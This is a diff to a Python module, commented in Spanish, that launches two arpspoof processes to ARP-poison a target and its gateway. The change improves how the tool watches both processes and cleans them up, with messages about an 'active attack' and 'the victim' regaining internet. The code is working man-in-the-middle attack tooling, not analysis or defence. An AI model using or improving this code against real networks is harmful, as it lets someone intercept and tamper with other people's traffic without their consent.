@@ -23,6 +23,7 @@ in Termux. This module only works on Linux (apt install dsniff).
 import shutil
 import subprocess
 import sys
+import time
 
 from rich import print as rprint
 
@@ -71,13 +72,23 @@ def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
     rprint(f"[bold green][✓][/bold green] Ataque activo (PIDs: {proc1.pid}, {proc2.pid})")
 
     try:
-        proc1.wait()
+        # Bloquea hasta que cualquiera de los dos arpspoof muera (o Ctrl+C).
+        # Si uno cae solo, el ataque queda a medias y debemos parar el otro.
+        while proc1.poll() is None and proc2.poll() is None:
+            time.sleep(0.5)
+        if proc1.poll() is not None or proc2.poll() is not None:
+            rprint("[bold yellow][!][/bold yellow] Un arpspoof terminó solo. Limpiando el resto...")
     except KeyboardInterrupt:
         rprint(f"\n[bold yellow][!][/bold yellow] Deteniendo y restaurando red...")
-        proc1.terminate()
-        proc2.terminate()
-        proc1.wait()
-        proc2.wait()
+    finally:
+        for p in (proc1, proc2):
+            if p.poll() is None:
+                p.terminate()
+                try:
+                    p.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    p.kill()
+                    p.wait()
         rprint("[bold green][✓][/bold green] Limpio. La víctima recobró internet.")
 
 
